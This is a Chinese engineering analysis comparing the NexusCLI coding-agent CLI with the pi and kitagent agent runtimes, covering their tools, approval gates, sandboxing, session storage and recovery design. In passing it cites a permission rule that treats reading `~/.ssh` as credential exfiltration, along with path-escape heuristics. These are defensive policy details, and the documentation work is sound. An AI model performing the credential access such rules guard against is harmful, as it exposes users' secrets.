| 2 | 工具集 | 8 个内置（read/write/edit/bash/powershell/grep/find/ls）+ codemode/MCP/tool-search 扩展（`src/core/tools/index.ts`、`src/extensions/`） | 25 个内置：文件/检索/命令/web_search/web_fetch/记忆/skill/索引/todo/子代理/后台任务/回滚（`tools/builtins.py:25-536`） | **NexusCLI 更全**：pi 无内置联网、记忆、审计、快照、RAG |
| 3 | 权限/审批 | **无**内置权限系统，无逐次审批；靠扩展实现（`README.md:88-96`、`examples/extensions/permission-gate.ts`） | 五键位 HITL（y/r/a/s/n）+ run 级授权 + 写域守卫 + `deny>ask>allow` 规则（`entrypoints/commands/approval.py:43-80`、`policy/permission_rules.py:3-15,128-131`） | **NexusCLI 是产品优势**，不可因 pi 不做而削弱 |
| 4 | 沙箱/隔离 | 零内置；容器/Docker Sandboxes/OpenShell/Gondolin 微 VM 四选一（`docs/containerization.md`），`SECURITY.md` 明示沙箱不在 scope | PathGuard + CommandGuard + fs_scope + net_guards + 可选场景级写沙箱（`policy/*.py`、`docs/eval.md`） | 路线不同：pi 是"部署期隔离"，NexusCLI 是"代码内治理"。理想是两者兼有 |
| 5 | MCP | 内置 `pi mcp add/list/login`，stdio + streamable HTTP + OAuth，project trust 门控；独立 `mcp` 包（`docs/mcp.md:1-30`） | client + server 双栈，HTTP 传输强制 API key，`tools/call` 同走 ToolExecutor 链（`mcp/`、`NEXUS.md:103`） | 平手偏 pi（OAuth/生态兼容）；NexusCLI 的 server 侧是加分项 |
| 6 | Skill | 实现 [Agent Skills 规范](https://agentskills.io/specification)，启动只注入描述、按需读全文、`/skill:name` 强制加载（`docs/skills.md:1-40`） | builtin/user/project 三层 + Agent Skills 扫描 + Top-K 匹配 + L0/L1/L2 分级加载 + `save_skill` 经 HITL 沉淀与 propose/evolve（`skill/`、`README.md` 特性表） | NexusCLI 更深（分级/沉淀/演进）；pi 更"标准兼容" |
| 7 | 子代理 | **不在核心**；官方示例扩展 `examples/extensions/subagent/`；durable 有前台/后台子代理配方但标 Experimental（`docs/extensions.md:3346`、`packages/durable/README.md:725-770`） | `task` 工具一等公民：后台执行、完成播报、文件邮箱互通、general-purpose/explore/自定义（`agent/subagent.py:40,149`、`tools/builtins.py:536`） | **NexusCLI 明显更强** |
| 8 | Plan / Team | **无** plan mode、无 team（`README.md:19`）；plan-mode 只有示例扩展（`examples/extensions/plan-mode/`） | Plan-and-Execute DAG + 图级 checkpoint 续跑 + `/team` Planner/Worker/Reviewer（`agent/plan_execute.py`、`agent/orchestrator.py:314`） | **NexusCLI 明显更强** |
| 9 | Workflow | 无内置；等价物是"写扩展"或 p2 里的 codemode 编排（`apps/p2/docs/workflows.md`） | `/workflow run` JSON 步骤图，按依赖批次并行派发子代理；`/expert` 同引擎（`docs/workflows.md`） | **NexusCLI 独有** |
| 10 | Eval | `packages/evals`：Docker 双镜像 docs-lift、host smoke、文档审计；不在 CI（`packages/evals/README.md:7-10`、`ci.yml`） | 双轨：hermetic（假 LLM 驱动真实 Agent，七类断言、多轮用户模拟、记忆召回）+ real（真模型、pass^k、LLM-judge、baseline 消融），hermetic 可作 CI 门禁（`eval/runner.py:158`、`docs/eval.md`） | **NexusCLI 体系更完整**；pi 的 docs-lift 对照是 NexusCLI 缺的一块 |
| 11 | Runtime/daemon | 无守护进程；RPC 模式是被客户端拉起的子进程（`docs/rpc.md:1-14`）；durable 才有持久化运行时（Experimental） | HTTP Runtime API（thread/turn/事件日志、SSE）+ SQLite 任务队列（原子领取、lease/heartbeat、取消安全）+ `cron` 注册表（`runtime/api.py:144,247`、`runtime/tasks.py:32,58-117`） | **NexusCLI 更强**；pi 的 durable 若转正会改变格局 |
| 12 | Web UI | `apps/p2` 自托管 owner/visitor 模式，官方标 "will be gone soon"（`apps/p2/README.md:3-8`） | 可视化工作台：会话回放、SSE 实时流、任务面板、usage、Web 审批（`docs/workbench.md`、`runtime/websession.py`） | NexusCLI 更"产品化"，pi 更"实验" |
| 13 | 包体/安装 | Node ≥22.19（`README.md:43`）+ 22 个直接依赖；npm 路径不 pin 传递依赖；另有 install.sh pin 版、Nix、Bun 单文件二进制（`README.md:25-70`、`:168-180`） | Python ≥3.11 + 6 个运行期依赖，`uv sync` / wheel（`pyproject.toml:9-16`） | NexusCLI 更轻；pi 的"单二进制 + pin 安装器"是值得学的分发形态 |
| 14 | 扩展生态 | npm/git 包 + 78 个官方扩展示例 + `pi install` 包管理器 + preview 包 + 高下载量（`examples/extensions/`、npm 数据） | `.nexuscli/plugins` 本地插件 + 自定义斜杠命令 + hooks；无公开包市场（`docs/plugins.md`、`docs/slash-commands.md`） | pi 生态量级领先一个数量级；NexusCLI 需先解决"可分发的包格式" |
| 15 | 会话/压缩 | JSONL 树 + `/tree`/`/fork`/`/clone` + 结构化压缩 + 分支摘要 + prompt cache 预热（`docs/sessions.md:30-40`、`docs/compaction.md:43-50`） | JSONL 会话 + `-c/--resume`/`/fork` + 80% 预算压缩 + microcompact + 超限重试（`session/store.py:300`、`context/manager.py:50,132,305`） | pi 的**会话树**与**缓存预热**领先；NexusCLI 的压缩分层更细 |
| 16 | 可观测 | telemetry 契约包 + `PI_TIMING` + usage/cost + cache 统计（`packages/telemetry`、`src/core/timings.ts`） | trace_id 贯穿审计与 LLM 请求头、可选 OTel/OTLP 导出、IO 脱敏落盘、usage 落库（`telemetry/`、`docs/observability.md`） | 平手；NexusCLI 更贴企业观测栈，pi 更贴自身产品 |

**矩阵读法**：pi 赢在 1/5/14/15（模型宽度、MCP 兼容、生态、会话树）；NexusCLI 赢在 2/3/7/8/9/10/11/12
（工具面、权限、子代理、plan/team、workflow、eval、runtime、web）。这不是"谁更强"，而是**两种产品定义**：
pi 把非核心能力外包给生态，NexusCLI 把非核心能力做成内置产品面。

---

### 6. 三组结论

#### 6.1 NexusCLI 可借鉴（机制级，按投入产出排序）

1. **会话树替代线性历史。** 现在 NexusCLI 是"JSONL + `-c/--resume`/`/fork`"（`session/store.py:300`）。
   pi 的做法是每条 entry 记 parent、用 `currentEntry` 指活动分支，`/tree`（同文件换分支）、`/fork`（新会话）、
   `/clone`（复制分支）语义分离（`docs/sessions.md:30-40`、`docs/session-format.md`）。落地成本低（JSONL 加
   两个字段 + 选择器），收益是"回退不再毁掉旧分支"，且能直接支撑"分支摘要"。
2. **压缩摘要结构化 + 文件操作累计跟踪。** pi 的摘要模板固定为 Goal/Constraints/Progress/Key Decisions/
   Next Steps/Critical Context，并跨压缩累计"改过哪些文件"（`docs/compaction.md:200-275`）。NexusCLI 已有
   microcompact 与摘要（`context/manager.py:305`），可以只替换摘要模板 + 加一个 file-touch 台账，
   成本极低、对长任务稳定性收益大。
3. **文档也要进 eval。** pi 的 docs-lift 用 Docker 双镜像对比 `with_docs`/`without_docs`，量化"文档对 agent
   任务通过率的贡献"（`packages/evals/README.md:7-10`、`:45-100`）。NexusCLI 有 21 篇 docs + site，且已有 hermetic eval
   框架（`eval/runner.py:158`），可以加一类"文档可用性"场景（同一个只读任务，允许/禁止读 docs），
   把"文档腐化"变成可测回归。
4. **供应链规则直接照抄。** ① 直接依赖精确 pin；② `min-release-age`（Python 侧等价物：`uv.lock` + CI 校验
   `uv sync --frozen`）；③ 禁 lifecycle script（`--no-build-isolation` / 白名单）；④ 定时 `pip-audit`。
   证据：`README.md:168-180`、`AGENTS.md:60-67`。这套规则与本仓库 AGENTS.md「可选依赖四步套路」同源，
   可直接扩充成 `scripts/check_supply_chain.py`。
5. **`check` 要做结构检查，不止 lint。** pi 的 `npm run check` 含 entry-graph、ts 相对导入、pinned-deps、
   install-lock 检查（根 `package.json` scripts）。NexusCLI 目前是 `ruff check` + `ruff format --check` +
   `pytest`（`NEXUS.md:36-45`），可以低成本加：分层导入方向检查（`agent/` 不得 import `entrypoints/`）、
   `pyproject` 依赖 pin 校验、`uv.lock` 漂移检查。
6. **工具输出必须有过模型可见的截断契约。** pi 有统一 `output-guard` 与 `truncateHead`（`src/core/output-guard.ts`、
   `examples/extensions/truncated-tool.ts`）。NexusCLI 的 bash 输出上限已有（AGENTS.md 记录过截断相关修复），
   但应把"截断发生点 + 被截断字节数"结构化写进 tool result，让模型知道信息缺失而不是幻觉补全。
7. **缓存成本感知。** pi 的 cache-warmer 只在"预期节省 ≥ $0.05"时才发预热请求（`src/core/cache-warmer.ts:12-25`），
   并把 cache 命中统计进 usage。NexusCLI 已有 pricing/usage（`llm/pricing.py`、`llm/usage_store.py`），
   可先做"cache 命中率与浪费估算"报表，再决定要不要主动预热。
8. **扩展可覆盖内置工具与渲染器。** pi 允许同名工具替换内置工具、替换 footer/editor/整套 overlay
   （`docs/extensions.md:2358-2391`、`:2815-3114`）。NexusCLI 插件当前是"并入斜杠命令+本地插件"
   （`docs/plugins.md`、`src/nexuscli/plugins`），下一步最小增量是"插件可注册工具（走同一 ToolExecutor 链、
   同审计同审批）"，而不是先做 UI 覆盖。

#### 6.2 不可照搬（生态/体量/定位差异）

1. **零权限模型不能学。** pi 的用户是自己审扩展源码的极客，且有容器兜底；NexusCLI 的 HITL + PathGuard +
   CommandGuard + 审计是产品卖点，也是 AGENTS.md 的硬规则（`NEXUS.md:97-107`）。删审批换"极简"是自毁差异。
2. **"扩展=进程内任意代码"不能学。** pi 的扩展可读 `auth.json`，官方只能建议"装之前看源码"
   （`docs/security.md`）。NexusCLI 若做进程内插件，必须保留声明式能力清单 + 审批 + 审计，否则一个第三方
   插件就是一次 RCE。
3. **12 包 monorepo 不能学。** 3.3 万行拆 12 包只会增加发布与联调成本；pi 敢这么拆是因为 `chord`/`durable`
   是要独立售卖的运行时（9 万行、14.5 万行测试），且仍标 Experimental。NexusCLI 现阶段"单包 + 内部模块
   边界"更划算，需要时再抽 `sdk` 包。
4. **34 个 provider 的 catalog 工程不能学。** pi 维护 `catalog/` + 生成文件 + pi.dev 目录 + Nix pin +
   `check:model-catalog`（`AGENTS.md:29`、`README.md:66`）。NexusCLI 的 OpenAI-compatible 薄抽象
   （`llm/factory.py:11-24`）已覆盖主要国产/兼容端点，正确策略是"配置驱动 + 少量原生适配"，不是逐个写适配器。
5. **极简哲学（无 plan/子代理/team）不能学。** 那是 pi 的差异化定位（`README.md:19`），不是行业最佳实践。
   NexusCLI 已把三条执行路径做成一等公民并在 eval 里覆盖（`NEXUS.md:50-58`），回退等于放弃最大优势。
6. **自研 TUI 不能学。** pi 用 2 万行源码 + 2.1 万行测试换"差分渲染 + CSI 2026 + 内联图片 + IME"
   （`packages/tui`）。NexusCLI 的 Rich + prompt_toolkit 是正确取舍；只有出现"必须内联图片/必须 overlay"
   的硬需求时才考虑局部自研。
7. **Bun 单文件二进制不能直接照抄路径。** pi 的分发优势来自 Bun 交叉编译（`scripts/build-binaries.sh`）
   与 install-lock。Python 侧对应物是 `uv` + wheel/zipapp + 自带运行时，收益与成本需单独评估，不能假设同构。

#### 6.3 pi 的弱点（可作为攻击面 / 差异化叙事）

1. **无内置安全门。** 无审批、无路径守卫、无命令守卫、无审计；`SECURITY.md` 把沙箱列为 out of scope，
   且文档自曝 project trust 的两个缺口（`sessionDir` 先读、上下文文件不受信任约束）。对"企业/团队落地"
   这是硬伤。
2. **核心能力缺层。** 无内置联网检索/抓取、无长期记忆、无审计日志、无快照回滚、无代码索引
   （`grep` 全仓无 `web_search`/`audit`/memory 工具实现）——这些恰好是 NexusCLI 已内置的（`tools/builtins.py`）。
3. **子代理/编排只有"示例级"答案。** 核心明确不做（`README.md:19`），durable 的完整配方标 Experimental
   且其宿主 p2 官方说"将被替换"（`apps/p2/README.md:3-8`）。
4. **扩展即 RCE，且有信任悖论。** 扩展进程内执行、无 capability 边界，同时又要求用户"审源码"；生态越大，
   供应链攻击面越大。对比 NexusCLI 的 MCP 强制 API key + 统一执行链（`NEXUS.md:103`）。
5. **行为回归不在 CI。** eval 需真模型与付费，`ci.yml` 无 eval job；978 个测试文件覆盖的是单元行为，不是
   "模型真的会不会按文档用工具"。这是 pi 自己用 docs-lift 想补、但没进门禁的洞。
6. **维护带宽被刻意收窄。** 新贡献者 issue/PR 默认自动关闭、靠 `lgtm` 白名单（`CONTRIBUTING.md:20-40`）；
   叠加 12 包 + 291 个发布版本 + 42 篇文档 + 78 个示例，bus factor 风险高。
7. **重心分散。** 39% 源码服务一个"将被替换"的实验 Web 应用；用户实际拿到的 CLI 链路只占 1/3 代码。
8. **安装面比 Python 单轮子重。** Node ≥22.19 + 22 个直接依赖；npm 安装路径不 pin 传递依赖，只有官方
   install.sh 才 pin（`README.md:37-43`、`:168-180`）。

---

### 7. 证据索引与复现方式

**pi 仓库内**

- 定位/哲学：`README.md:15-21`、`README.md:88-96`、`CONTRIBUTING.md:3-9`
- 包表与分发：`README.md:25-84`、`:155-180`、`docs/cli.md:5-16`
- 架构：`packages/agent/src/agent-loop.ts:1-60`、`packages/agent/README.md:40-129`、
  `packages/coding-agent/docs/how-pi-works.md:7-43`
- 扩展：`packages/coding-agent/docs/extensions.md:68-120`、`:307-412`、`:1567-2140`、`:2358-2391`、`:3273-3367`
- 权限/安全：`packages/coding-agent/docs/security.md:3-75`、`SECURITY.md:3-47`、`docs/containerization.md:1-50`
- 上下文：`packages/coding-agent/docs/compaction.md:14-50`、`:200-275`、`:293-416`
- 会话：`docs/how-pi-works.md:22-37`、`docs/sessions.md:1-40`、`docs/session-format.md`
- 模型：`packages/ai/README.md:62-100`、`packages/coding-agent/docs/models.md:1-60`
- TUI：`packages/tui/README.md:1-80`、`:364-692`
- codemode：`packages/codemode/README.md:1-20`、`:56`、`:138-160`（"Why a separate Worker"）、`:358-380`（"How it works"）
- chord/durable/env：`packages/chord/README.md:3-12`、`packages/durable/README.md:3-8`、`:725-770`、
  `packages/env/README.md:1-8`、`apps/p2/README.md:3-8`
- eval：`packages/evals/README.md:7-10`、`:24-42`、`:45-100`
- 工程：`test.sh:1-84`、`.github/workflows/ci.yml:1-56`、根 `package.json` scripts、`AGENTS.md:15-67`

**官方 URL（2026-11-07 全部返回 200）**

- 站点与文档：https://pi.dev 、https://pi.dev/docs/latest
- 仓库：https://github.com/earendil-works/pi
- 模型目录：https://pi.dev/models
- RFC/路线图：https://rfc.earendil.com/keyword/pi
- Agent Skills 规范：https://agentskills.io/specification
- 生态集成示例：https://github.com/OpenClaw/OpenClaw 、https://github.com/badlogic/pi-skills
- Discord：https://discord.com/invite/3cU7Bz4UPx

**NexusCLI 侧引用**：`NEXUS.md:15-23,50-79,97-107`、`README.md` 特性表、`pyproject.toml:9-16`、
`src/nexuscli/policy/{permission_rules.py:3-15,128-131,path_guard.py:10,command_guard.py:10,audit_log.py:31}`、
`src/nexuscli/tools/{executor.py:28,builtins.py:25-536}`、`src/nexuscli/entrypoints/commands/approval.py:43-80`、
`src/nexuscli/agent/{subagent.py:40,149,orchestrator.py:314}`、`src/nexuscli/context/manager.py:50,132,305`、
`src/nexuscli/runtime/{api.py:144,247,tasks.py:32,58-117}`、`src/nexuscli/eval/runner.py:158`、
`src/nexuscli/llm/factory.py:11-24,120`、`src/nexuscli/session/store.py:300`、`src/nexuscli/hooks/{registry.py:17,config.py:120-128}`

**复现**：`find packages -name '*.ts' -not -path '*/node_modules/*' | xargs wc -l`；`ls packages/*/CHANGELOG.md`；
`curl -s https://api.npmjs.org/downloads/point/last-week/@earendil-works/pi-coding-agent`；
star 数来自 `curl -L https://github.com/earendil-works/pi` 页面内嵌 `"stargazerCount":120600`。

# 附录 C：kitagent 竞品分析底稿（原文）

## kitagent 竞品分析：一个 daemon-first 的本地 Agent 运行时

> 分析对象：[zed123214/kitagent](https://github.com/zed123214/kitagent)，本地只读克隆 `/tmp/nexus-research/kitagent`（单 commit `eccf32b`）。
> 对照对象：NexusCLI `/Users/linyixi/nexuscli`（v0.2.0）。
> 方法：文档全读（10 篇机制文档 + 5037 行 `WIRE_PROTOCOL.md` + RUNBOOK/CONTRIBUTING）＋ 源码实读（128 个源文件 / 20498 行，按模块抽读关键实现与行号）＋ 测试与 CI 清点。
> 边界：只读分析，未运行其测试；文中的性能数字标「自述」，均来自 README 自报，不可复跑验证。

---

### 0. 结论速览

**一句话**：kitagent 不是「更全能的 CLI」，而是**把 CLI 拆成「常驻 Core（状态所有者）+ 瘦客户端」并把这个边界协议化**的一次完整工程示范。它的价值 80% 在于**边界与失败语义**（谁拥有 run、挂起是返回值、恢复要 capability、预算分四类、可选依赖不污染核心），20% 在于功能面（K8s 沙箱、Web 工作台、TUI）。功能面上它明显比 NexusCLI 窄：9 个内置工具、单一 Anthropic provider、记忆只有 14 行 loader、没有 eval。

**三条判断**：

1. **能力重叠度高，但重叠在「已有更好实现」的一侧**。NexusCLI 在工具面、provider 面、记忆、Skill、子代理编排、eval、MCP server 上均强于 kitagent；kitagent 只在**执行可靠性语义**与**多入口一致性**上强。
2. **它对 NexusCLI 最有价值的部分，2026-10-25 已经对齐过一轮**（`.spec/plans/2026-10-25_kitagent-alignment/master.md:20-50` 的 A1–A14，及 `05-execution-durability.md` 的 F9–F13）。因此本轮真正的增量不是「再照搬一遍」，而是**三处尚未搬的语义**：预算四分法、checkpoint↔transcript 对账规则、owner-only 的就绪态查询。
3. **它的架构不该整体复制到 NexusCLI**。capability token / resume lease / 多存储对账是为「常驻多客户端 + 跨进程接管」付的复杂度；NexusCLI 是单用户 CLI + 可选 Runtime API，`workbench-and-readme` 计划已明确「不照搬多租户恢复外壳」（`.spec/plans/2026-10-25_workbench-and-readme/master.md:112`），这个判断是对的。

---

### 1. 定位与形态

| 项 | 事实 | 出处 |
| --- | --- | --- |
| 自我定位 | "portfolio-oriented local AI Agent runtime"（作品集导向的本地 Agent 运行时） | `CONTRIBUTING.md:3` |
| 项目名 | `agent-runtime-kit` v0.0.1，Python `>=3.12,<3.13` | `pyproject.toml:3-10` |
| 许可 | MIT | `LICENSE:1-2` |
| 规模 | src 20498 行 / 128 文件；tests 22024 行 / 99 文件（661 个 test 函数） | `wc -l` 统计 `src/`、`tests/`（见 §7.2） |
| 入口 | 5 个 console script：`agentrt`（CLI）、`agentrt-core`（daemon）、`agentrt-tui`、`agentrt-sandbox`（Worker）、`agentrt-web`（网关） | `pyproject.toml:40-46` |
| 形态 | 常驻 Core 拥有执行状态；CLI/TUI/Web 都是它的客户端 | `docs/architecture.md:9-18` |
| 声明模式 | 4 种组合：Loop+Local（默认）/ Graph+Memory / Graph+SQLite+Local（重启恢复）/ Loop\|Graph+Memory+K8s | `README.md:218-225` |
| 部署产物 | `Dockerfile` + `deploy/kubernetes/` 全套（namespaces / network-policy / rbac / core 模板 / kind / validation-job） | `deploy/kubernetes/` |

**定位判读**：kitagent 把自己界定为「**本地**、**单租户**、**可被三种前端共享**」的运行时。它反复自陈的信任边界是 loopback + 同一 OS 用户（`docs/tool-permissions.md:88-95`），这决定了后面所有安全机制的真实收益上限——**能力令牌防的是同机其他客户端，不是远程攻击者**。

---

### 2. 核心架构：daemon + typed IPC

#### 2.1 一次 run 的 5 步

`docs/architecture.md:9-18`：

1. 客户端在 `127.0.0.1:7437` 上以 **NDJSON**（每行一条 JSON）发 **JSON-RPC 2.0** 命令；
2. daemon 路由到 handler，`SessionManager` 记录 session 并建 run；
3. `AgentRunner` 装配 provider / tools / permissions / events / `ExecutionContext`；
4. `ExecutionEngine`（loop 或 graph）跑编排；
5. run 级 `EventBus` 给事件补 correlation 元数据，**只写本 run 的 JSONL**，再 fan-out 给订阅者。

传输层：`WIRE_PROTOCOL.md:5-11`。命令走 `params.type` 路由，事件走 `kind=event` 信封。错误码直接用 JSON-RPC 标准码（`WIRE_PROTOCOL.md:5028-5037`）。

#### 2.2 typed IPC 解决了什么

四件事，每件都是「进程内调用免费、跨进程必须显式」的东西：

1. **判别联合即路由表**。`core/bus/commands.py` 全部 pydantic 模型 + 末尾 `Command = Annotated[PingCommand | ..., Discriminator("type")]`（`commands.py:184-202`）。加一个命令＝加一个模型，非法 `type` 在解析期就被拒，不需要 if/elif 链散落各处。
2. **每个命令的字段就是它的授权契约**。例如 `PermissionRespondCommand` 必须同时带 `tool_use_id/session_id/run_id/interrupt_id/expected_revision`（`commands.py`），`SessionResumeCommand` 必须带 `resume_token + expected_revision`——**协议层强制「回答谁的问题」和「乐观锁」不可省**，而不是靠 handler 记得检查。
3. **事件是契约而非日志**。`run.started/finished/suspended/resumed`、`step.*`、`tool.call_*`、`permission.*` 都是有字段定义的模型（`WIRE_PROTOCOL.md` 目录），且 `run.finished` 的 status 被收窄为 `success|failed`（`docs/architecture.md:72-94`）。
4. **协议文档是生成物且有漂移门**。`WIRE_PROTOCOL.md` 由 `scripts/generate_wire_protocol.py` 生成（文件头「Do not edit manually」），CI 跑 `scripts/check_wire_protocol.py --check`（`.github/workflows/ci.yml:133-134`）。

#### 2.3 typed IPC 没解决什么

**客户端仍然是无类型的**。服务端有 pydantic 模型，客户端 API 却是 `send_command(method: str, params: dict[str, Any])`（`core/transport/socket_client.py:51`），调用点散落字面量：`send_command("session.create", {"mode": "chat"})`（`tui/app.py:899`）、`send_command("agent.run", {"goal": goal})`（`cli/commands/run.py:219`）。**没有任何共享 schema / codegen**，所以「协议文档 5037 行」与「客户端手写字典」之间存在结构性漂移面。这是它最明显的设计缺口，也直接决定了它没做 SDK（见 §6.2）。

#### 2.4 为什么 NexusCLI 现在不该复制 daemon

- NexusCLI 已有等价物：`RuntimeApiServer`（`src/nexuscli/runtime/api.py:17,223`，`ThreadingHTTPServer` + SSE + `DurableTaskManager` 租约队列 `runtime/tasks.py:31-64`），覆盖「跨进程执行 + 多客户端 + 断线重连」。
- daemon 化带来的是**引用方式变化**，不是能力变化：TUI 能连、CLI 能连、Web 能连，靠的是同一套协议；NexusCLI 的 REPL 若要变成客户端，代价是把 1222 行 `entrypoints/repl.py` 的执行循环改成事件消费。
- 结论：**借协议语义，不借进程模型**。可迁移的是 §2.2 的 1/2/3，而不是 §2.1 的 daemon。

---

### 3. 关键机制逐项

#### 3.1 引擎抽象：loop vs graph

- 边界：`ExecutionEngine` 是 `Protocol`，只有 `run/resume/cancel` 三个方法，签名里显式要求「runner 拥有依赖装配与事件持久化，引擎只拥有编排，必须原地更新传入的 `ExecutionContext` 并返回等价 `RunOutcome`」（`core/engine/base.py:145-175`）。
- **挂起是一等返回值**：`type EngineRunResult = RunOutcome | RunSuspension`（`base.py:100`），`RunSuspension(run_id, session_id, reason, checkpoint_revision, interrupt_id, event_seq)`（`base.py:88-98`），`SuspensionReason = Literal["permission","process_recovery","outcome_unknown"]`（`base.py:85`）。
- **不支持也是类型化的**：`ExecutionEngineOperationUnsupportedError` 的 code 是 `f"{operation}_unsupported"`（`base.py:132-141`）——loop 引擎的 `resume`、memory 后端的恢复都返回它，而不是 500。
- **graph 引擎不接管治理**：显式拓扑 `START -> model <-> kit_tools -> END`，自己写 `KitToolNode` 走 `invoke_tool()`，明确不用 LangGraph 的 `ToolNode/create_agent/create_react_agent`（`docs/graph-engine.md:88-106`）；RuntimeState 只放 JSON 兼容数据（`:108-125`）。
- **可选依赖不污染核心**：`EngineRouter._resolve_graph_builder` 惰性 import，只把 `exc.name == "langgraph" or startswith("langgraph.")` 翻译成安装指引，其他 import 错误原样抛（`core/engine/router.py:111-124`）；`ensure_graph_available()` 在 provider/MCP 构造之前打开 saver（`router.py:83-104`）。

**评价**：这是全仓库最值得学的一段。它把「同一个 run 有两种实现」压成三个方法 + 一个 sum type + 一组 typed 错误码，代价是双引擎带来的 `_unsupported` 分支（见 §6.3）。

#### 3.2 checkpoint / durable recovery

四套存储，权责被显式写死（`docs/durable-recovery.md:34-46`）：

| 存储 | 权责 |
| --- | --- |
| `thread.jsonl`（`SessionStore`） | 已提交 transcript 的唯一权威 |
| LangGraph `AsyncSqliteSaver` | graph 状态 / 最近 task / 节点 / pending interrupt / revision |
| `events.jsonl` | 有序审计 + 回放游标（`event_seq` 单调） |
| `RecoveryStore`（自建 SQLite） | run 恢复索引 / resume capability hash / transcript 提交进度 / resume lease / tool journal |

- **生命周期**：`run.started → run.suspended → session.resume → run.resumed（同一 run_id）→ run.finished（恰好一个终态）`（`docs/durable-recovery.md:48-65`）。daemon 启动把遗留 `running/resuming` 标 `suspended` 且**不自动执行**，必须显式 attach（`core/graph/recovery.py:506` `suspend_interrupted_runs`）。
- **capability 绑定所有权**："possession of a session ID alone never transfers command or approval authority"（`docs/architecture.md:96-107`）。token 只存 SHA-256 摘要 + version、常量时间比较、成功后原子轮换并下发下一个 token（`docs/durable-recovery.md:84-99`，实现 `recovery.py:785-938`）。
- **工具 journal 四态**：`execute / reuse / in_progress / outcome_unknown`（`recovery.py:1019` `claim_tool`），键 `(session_id, run_id, tool_use_id)` + 规范化 input hash；`completed` 复用、`started` 变 `outcome_unknown` 不重放、同键不同参数是 typed conflict（`recovery.py:25-78` 的 CHECK 约束把「completed 必有结果」写进库）。
- **transcript↔checkpoint 三条对账规则**（`docs/graph-engine.md:127-149`）：① 无 checkpoint 用完整 transcript 播种；② checkpoint 是 transcript 的精确结构前缀 → 只补新后缀；③ 非前缀 → memory 后端删 thread 重播种，而**未完成 SQLite run 时 checkpoint 是编排权威，非前缀直接 typed `checkpoint_conflict`，不重置不重跑**。
- **事件持久化的实现细节**：写入端强制 `event_seq` 连续，缺口直接抛 `EventSequenceError`（`core/events/writer.py:49-53`），每条事件 `flush + os.fsync`（`writer.py:56-57`）；尾部半行可截断，中部损坏/游标缺口是 typed corruption，「永不跳过中间损坏行」（`docs/durable-recovery.md:149-171`）。

#### 3.3 权限模型

三层：静态策略 → 会话模式 → 交互等待。

- 策略层：`ToolPolicy(default, allow_patterns, deny_patterns)`，默认 `bash=ASK / write_file=ASK / read_file=ALLOW / list_dir=ALLOW / note_save=ALLOW`，**未登记工具默认 ASK**（`core/permissions/policy.py:45-61`）；`evaluate()` 四层：`deny_patterns → outside_cwd 强制 ASK → allow_patterns → tool default`（`policy.py:117-148`）。
- 会话层：`PermissionMode = Literal["ask","read_only","auto"]`（`policy.py:10`）+ `SessionPermissions(mode, allowed_tools, revision)`（`:13-18`）；`read_only` 只放行 `read_file/list_dir`，连遗留 allow 策略也压住（`docs/tool-permissions.md:30-41`）。
- 交互层：`PermissionManager.check_and_wait` 建 future、发 `permission.requested`（含脱敏预览）、`asyncio.wait_for(..., timeout_s=60)`，超时返回 `(False,"timeout")`（`manager.py:203-263`）；`respond()` 校验决策白名单、要求 session/run 成对、越权与不存在一律拒绝（`manager.py:266-333`）；`cancel_session` 把 pending future 置 `deny_once` 防止永久挂起（`manager.py:389-403`）。
- 脱敏：`param_preview` 对 `api_key/authorization/password/resume_token/secret` 整值替换 `[REDACTED]`，另有正则兜底（`policy.py:64-114`）。
- 五态决策：`allow_once / allow_session / always_allow / deny_once / always_deny`（`docs/tool-permissions.md:19-27`）。

**与 NexusCLI 的关键差异**：kitagent 的判断是**命令级正则启发式**（`OUTSIDE_CWD_HEURISTICS` 7 条，`policy.py:27-42`：绝对路径、`~`、`..`、`$HOME`、`$PWD`、`cd`），文档自己承认「既不是会话模式也不是启发式等于 OS 文件系统沙箱」（`docs/tool-permissions.md:30-41`）。NexusCLI 在这方面更细：`policy/fs_scope.py`（387 行）做写域判定、`runtime/approvals.py`（532 行）+ 审计链，还有 AGENTS.md 固化的「`allow` 语义 / `2>/dev/null` 不算域外写 / `~/.ssh` 视为外带凭证」规则。**这是 NexusCLI 更强的一侧，不该反向对齐**。

#### 3.4 K8s 沙箱

这是 kitagent 唯一「NexusCLI 完全没有」的能力面，工程化程度也最高：

- **拓扑**：单副本 Core + 同集群 Worker；两个 Namespace（`kitagent-core` / `kitagent-sandboxes`）；Core `replicas: 1` + `strategy: Recreate`；不读 kubeconfig、不用 `pods/exec`、NodePort、hostPath（`docs/kubernetes-sandbox.md:9-30`）。
- **双容器边界**：broker（UID 10000，只读 token Secret 与 `/tmp/control`，不挂 workspace）与 executor（UID 10001，有 `/workspace`，无 token、无 TCP 监听、无模型凭据）；两容器不共享 PID namespace 与根挂载；non-root + drop ALL + `RuntimeDefault` seccomp + 只读根（`:89-115`）。
- **网络**：默认出站全拒、无 DNS 例外；ingress 只允许指定 Core namespace 且匹配 Core label/scope 的 Pod 到 broker 端口。`network_policy_verified` 默认 `false`，Core 启动与每次 dispatch 前**读取整个 Sandbox Namespace 的策略并要求恰好是本实现的两条**，多一条也拒绝（多策略可能并集放行）。
- **文件 API**：拒绝 `..`、workspace 外绝对路径和**所有**符号链接（含指向内部的），每个路径分量用已打开目录 fd + `O_NOFOLLOW` 遍历（`:117-145`）。限额：Read ≤512KiB / Write ≤1MiB / List ≤200 条深度 4 / stdout+stderr 各 ≤64KiB。
- **幂等与代际**：broker dispatch 前原子登记 `{sandbox_id, run_id, tool_call_id}` + input hash；同键同输入进行中共享 task、终态复用字节结果、同键不同输入冲突；`workspace_lost` 墓碑防止旧 Session 拿到空工作区（`:147-175`）。
- **抽象层**：`SandboxBackend`（ensure/status/destroy/reconcile）与 `SandboxRuntime`（exec/read_text/write_text/list_dir）两个 Protocol 分离（`core/sandbox/base.py:23,35`）；Local 实现第一行就写 "Host execution adapter. This is not filesystem, process, or network isolation."（`core/sandbox/local.py:1`）。
- **自述验收**（`README.md:121-131`，不可复跑）：M1 13/13、M2 442/442、20 会话 × 200 次跨会话探测泄漏 0、创建回收残留 0、冷启动到 Ready p95 3.52s、就绪后执行 p95 19.26ms。

**判读**：价值不在「我们也去做 K8s 沙箱」，而在**§3.4 的抽象形状**——工具不直接起子进程，而是打给一个可替换的 `SandboxRuntime`；`remote_execution=True` 的工具跳过本地 120s 超时包装（`core/tools/invocation.py:294-298`），因为远端有自己的排队/供给/命令/清理期限。这个 seam 是 NexusCLI 未来接容器执行（或给 eval 做真沙箱）时唯一需要照抄的结构。

#### 3.5 Web Workbench

